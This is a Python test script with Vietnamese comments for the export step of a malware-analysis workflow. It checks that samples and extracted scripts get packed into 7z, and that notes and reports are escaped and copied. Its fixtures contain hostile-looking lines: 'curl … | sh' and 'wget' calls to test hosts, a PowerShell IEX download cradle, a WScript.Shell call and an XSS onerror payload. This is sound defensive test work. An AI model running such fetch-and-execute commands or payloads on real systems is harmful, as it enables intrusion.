#!/usr/bin/env python3
"""flow.py export / export.py trên case tổng hợp: mẫu, file giải nén, payload, bản dump không header, snapshot giả lập vào 7z (không chép
dạng rõ); bỏ .claude/, work/ghidra/; MANIFEST, README dòng đầu có sha256; không xóa thư mục lạ; thông tin mẫu, ghi chú thu mẫu (escape),
bản trùng hash; liên kết báo cáo trỏ vào bản chép. 7z giả (ghi danh sách file) thay cho 7z thật. Chạy: python3 tests/check_export.py"""
import os, sys, json, stat, shutil, hashlib, tempfile, subprocess
SKILL = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
T = tempfile.mkdtemp(prefix='rea-export-'); os.umask(0o022)
FAKE7Z = os.path.join(T, 'fake7z'); LIST = os.path.join(T, 'packed.json')
open(FAKE7Z, 'w').write('#!/usr/bin/env python3\nimport sys, json\na = sys.argv[1:]; assert "-spd" in a and a[-1][0] == "@"\n'   # danh sách qua @file
                        f'json.dump(open(a[-1][1:]).read().split(), open({LIST!r}, "w")); open(a[-2], "wb").write(b"7z\\xbc\\xaf\\x27\\x1c")\n')
os.chmod(FAKE7Z, 0o700); os.environ['SEVENZ_BIN'] = FAKE7Z
sys.path.insert(0, SKILL)
import export  # noqa: E402

def w(p, b):
    os.makedirs(os.path.dirname(p), exist_ok=True); open(p, 'wb').write(b if isinstance(b, bytes) else b.encode()); return p
try:
    inbox = os.path.join(T, 'IN'); smp = b'\x7fELF' + b'\x02' * 60; h = hashlib.sha256(smp).hexdigest()
    src = w(os.path.join(inbox, 'U1', 'a', 'x.bin'), smp); dup = w(os.path.join(inbox, 'U2', 'y.bin'), smp)
    note2 = w(os.path.join(inbox, 'U1', 'a', 'z.txt'), '$ sha256sum /m/x.bin\nok\n')   # ghi chú chỉ có dòng lệnh trên mẫu (watch.note_of nhận): export cũng gom
    w(os.path.join(inbox, 'U3', 'z.txt'), '$ sha256sum /m/x.bin\nhost=khac\n')   # cùng basename x.bin nhưng ghi chú nằm thư mục khác (mẫu khác): không gom
    note = w(os.path.join(inbox, 'U1', 'a', 'x.txt'), '# host=m1|<b>x</b> ip=10.0.0.9 at=2026-01-01\n$ ls -la /usr/lib/x\n' + h + '  /usr/lib/x\n<img src=x onerror=alert(1)>\n')
    scr = w(os.path.join(inbox, 'U1', 'a', 'x.log'), 'curl http://bad.test/p | sh\n')   # tên giống ghi chú nhưng là script: không gom, không chép rõ
    sums2 = w(os.path.join(inbox, 'U2', 'SHA256SUMS'), h + '  y.bin\n')                # cùng tên ở thư mục khác: không đè nhau
    sums = w(os.path.join(inbox, 'U1', 'a', 'SHA256SUMS'), h + '  x.bin\n' + '0' * 64 + '  other\n')
    c = os.path.join(T, 'ws', 'x_' + h[:8])
    w(os.path.join(c, 'work', 'sample', 'x.bin'), smp)
    w(os.path.join(c, 'work', 'extract', 'stage2.ps1'), 'IEX (New-Object Net.WebClient)\n')   # script giải nén: gói theo vị trí
    w(os.path.join(c, 'work', 'runs', 'emu', 'snap_oep.bin'), b'\x80\x04\x95' + b'\0' * 40)   # snapshot giả lập (pickle): nhị phân
    w(os.path.join(c, 'work', 'stage1.bin'), b'\0\0\0\0' + b'\x90' * 50)                      # dump bộ nhớ không header
    w(os.path.join(c, 'work', 'runs', 'triage.txt'), 'triage ok\n')
    w(os.path.join(c, 'work', 'ghidra', 'p.gpr'), 'ghidra'); w(os.path.join(c, 'work', 'scripts', '.claude', 'x.json'), '{}')
    w(os.path.join(c, 'work', '.watch.lock'), '')
    w(os.path.join(c, 'work', 'runs', 'mixed.txt'), b'text ' * 20000 + b'\x00\x01MZ')                # text ở đầu, nhị phân phía sau: gói
    w(os.path.join(c, 'work', 'runs', 'tool', 't', 'stage2.ps1'), 'Write-Host hi\n')                   # OUT_DIR của công cụ T1b: gói
    w(os.path.join(c, 'work', 'runs', 'tool', 't.out'), 'config: host=h.test\n')                      # output của công cụ: chép rõ
    w(os.path.join(c, 'work', 'NOTES.md'), '- chạy `curl x | sh` là cấm; import os\n'); w(os.path.join(c, 'work', 'review', 'r1', 'review.json'), '{"function": 1}\n')   # file của quy trình, nội dung giống script: chép rõ
    w(os.path.join(c, 'work', 'NOTES.md_stage2.md'), 'Add-Type y\n'); w(os.path.join(c, 'work', 'review', 'deep', 'er', 'x.md'), 'Add-Type z\n'); w(os.path.join(c, 'work', 'review', 'llm_cache', 'k.prompt.md'), 'function f() { import os }\n')   # tên/đường gần giống file quy trình nhưng không khớp chính xác: vẫn xét SCRIPT, gói 7z
    w(os.path.join(c, 'work', 'review', 'r1', 'payload.ps1'), 'Add-Type x\n'); w(os.path.join(c, 'work', 'runs', 'watch', 's01.jsonl'), '{"cmd": "wget http://x.test"}\n')
    w(os.path.join(c, 'work', 'runs', 'dec', 'decoded.vbs'), 'Set o = CreateObject("WScript.Shell")\n')   # script giải mã: gói
    w(os.path.join(c, 'report', 'evidence', 'snip.txt'), 'curl http://h.test | sh\n')                  # trích dẫn trong evidence: chép rõ
    w(os.path.join(c, 'facts.jsonl'), json.dumps({'id': 's.ft', 'kind': 'filetype', 'value': 'ELF x86-64', 'src': 'S', 'evidence': 'report/evidence/e.txt#L1',
                                                  'status': 'active', 'verified_by': '', 'supersedes': '', 'stage': '', 'note': '', 'ts': '2026-01-01T00:00:00'}) + '\n')
    w(os.path.join(c, 'report', 'evidence', 'e.txt'), 'ELF x86-64\n')
    w(os.path.join(c, 'report', 'report-2026-01-01.md'), '# Báo cáo\n\n## 1. Tóm tắt\n\nXem [e](evidence/e.txt#L1), [mẫu](../work/sample/x.bin), [web](https://x.test/a).\n')
    w(os.path.join(c, 'report', 'report-2026-01-01.html'), '<html><style>x{}</style><nav><div class="t">B</div></nav><main><section><a href="evidence/e.txt#L1">e</a></section></main></html>')
    st = {'source': src, 'inbox': inbox, 'sha256': h}
    out = os.path.join(T, 'Report'); d = os.path.join(out, 'x.bin_data')
    info = export.write(c, st, d)
    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note, note2] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
    assert info['ftype'] == 'ELF x86-64' and info['notes'][0]['sha'] == 'khớp' and info['notes'][0]['path'] == '/usr/lib/x', info['notes']
    P = sorted(json.load(open(LIST)))
    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs', 'work/review/r1/payload.ps1', 'work/runs/watch/s01.jsonl', 'work/NOTES.md_stage2.md', 'work/review/deep/er/x.md', 'work/review/llm_cache/k.prompt.md']), P
    files = sorted(os.path.relpath(os.path.join(dp, n), d) for dp, _, ns in os.walk(d) for n in ns)
    assert not any(f.startswith(('work/sample', 'work/extract', 'work/ghidra')) or '.claude' in f or f.endswith(('snap_oep.bin', 'stage1.bin', '.watch.lock')) for f in files), files
    assert {'work/runs/triage.txt', 'facts.jsonl', 'report/evidence/e.txt', 'x.bin.md', 'x.bin.html', 'README.txt', 'MANIFEST.sha256', export.ZIP,
            'ghi_chu_thu_mau/U1/a/x.txt', 'ghi_chu_thu_mau/U1/a/SHA256SUMS', 'ghi_chu_thu_mau/U2/SHA256SUMS'} <= set(files), files
    assert {'work/NOTES.md', 'work/review/r1/review.json'} <= set(files) and 'work/runs/watch/s01.jsonl' not in files, files
    assert not any(f.endswith('x.log') for f in files) and {'work/runs/tool/t.out', 'report/evidence/snip.txt'} <= set(files), files
    assert not os.path.exists(d + '.list'), 'file danh sách 7z phải bị xóa'
    first = open(os.path.join(d, 'README.txt'), encoding='utf-8').readline(); assert f'(sha256 {h})' in first and export.ours(d), first
    man = open(os.path.join(d, 'MANIFEST.sha256'), encoding='utf-8').read(); assert f'{h}  {export.ZIP}:work/sample/x.bin' in man, man
    assert '  x.bin.md\n' in man and '  x.bin.html\n' in man and f'  {export.ZIP}\n' in man, man   # báo cáo dựng trong .part, có trong MANIFEST
    assert stat.S_IMODE(os.stat(d).st_mode) == 0o755, oct(os.stat(d).st_mode)   # không giữ 0700 của mkdtemp: báo cáo dùng chung được (umask 022)
    md = open(os.path.join(d, 'x.bin.md'), encoding='utf-8').read()
    assert '(MANIFEST.sha256)' in md and 'href="MANIFEST.sha256"' in open(os.path.join(d, 'x.bin.html'), encoding='utf-8').read(), md   # MANIFEST ghi sau augment
    assert md.index('## Thông tin mẫu') < md.index('## 1. Tóm tắt') and '(report/evidence/e.txt#L1)' in md and f'({export.ZIP})' in md and '(https://x.test/a)' in md, md
    assert 'U2/y.bin' in md and 'host=m1\\|&lt;b&gt;x&lt;/b&gt;' in md and '<b>' not in md and '<img' not in md and 'bad.test' not in md, md
    ht = open(os.path.join(d, 'x.bin.html'), encoding='utf-8').read()
    assert 'id="thong-tin-mau"' in ht and 'href="report/evidence/e.txt#L1"' in ht and '&lt;img src=x' in ht and '<img' not in ht and 'bad.test' not in ht and 'href="#thong-tin-mau"' in ht, ht
    import watch  # noqa: E402  reported() đọc dòng đầu README.txt do export ghi
    assert watch.reported(out) == {h}
    # xuất lại: làm mới thư mục của mình; thư mục lạ trùng tên thì không xóa
    export.write(c, st, d); assert export.ours(d)
    lạ = os.path.join(out, 'z_data'); w(os.path.join(lạ, 'README.txt'), 'của người dùng\n')
    gen = os.path.join(c, 'report', 'GENERATED.md'); os.remove(gen)
    try: export.export(info, lạ); raise AssertionError('xóa thư mục lạ')
    except OSError as x: assert 'không do export sinh' in str(x) and os.path.exists(os.path.join(lạ, 'README.txt')) and not os.path.exists(gen)   # kiểm đích trước, chưa sinh báo cáo
    # thư mục tạm riêng mỗi lần: .part cũ (lần bị giết) quá PART_TTL thì dọn, .part mới (lần xuất song song) giữ nguyên
    stale, live = (os.path.join(out, f'.x.bin_data.{k}.part') for k in ('old1', 'new1'))
    for p in (stale, live): os.makedirs(p)
    os.utime(stale, (1, 1)); export.write(c, st, d)
    assert not os.path.exists(stale) and os.path.isdir(live) and export.ours(d), os.listdir(out)
    real = os.rename; os.rename = lambda *x: (_ for _ in ()).throw(OSError('đích bận'))   # thay đích lỗi: không bỏ lại .part
    try: export.write(c, st, d); raise AssertionError('phải lỗi')
    except OSError: pass
    finally: os.rename = real
    assert sorted(x for x in os.listdir(out) if x.endswith('.part')) == [os.path.basename(live)], os.listdir(out)
    # flow.py export CASE OUT (case không do watch nhận: lấy mẫu trong work/sample)
    r = subprocess.run([sys.executable, os.path.join(SKILL, 'flow.py'), 'export', c, os.path.join(T, 'manual')], capture_output=True, text=True, env=dict(os.environ))
    assert r.returncode == 0 and os.path.isfile(os.path.join(T, 'manual', 'x.bin_data', 'x.bin.html')), r.stdout + r.stderr
    # 7z không chạy được: lỗi rõ, không im lặng chép mẫu dạng rõ
    os.environ['SEVENZ_BIN'] = os.path.join(T, 'khong-co-7z')
    r = subprocess.run([sys.executable, os.path.join(SKILL, 'flow.py'), 'export', c, os.path.join(T, 'no7z')], capture_output=True, text=True, env=dict(os.environ))
    assert r.returncode == 1 and '7z' in r.stdout and not os.path.exists(os.path.join(T, 'no7z', 'x.bin_data')), r.stdout + r.stderr   # không để lại thư mục dở
    os.environ['SEVENZ_BIN'] = FAKE7Z   # chạy lại sau lỗi: thư mục dở .part được dọn, xuất bình thường
    r = subprocess.run([sys.executable, os.path.join(SKILL, 'flow.py'), 'export', c, os.path.join(T, 'no7z')], capture_output=True, text=True, env=dict(os.environ))
    assert r.returncode == 0 and export.ours(os.path.join(T, 'no7z', 'x.bin_data')) and os.listdir(os.path.join(T, 'no7z')) == ['x.bin_data'], r.stdout + str(os.listdir(os.path.join(T, 'no7z')))
finally: shutil.rmtree(T, ignore_errors=True)
print('OK check_export')
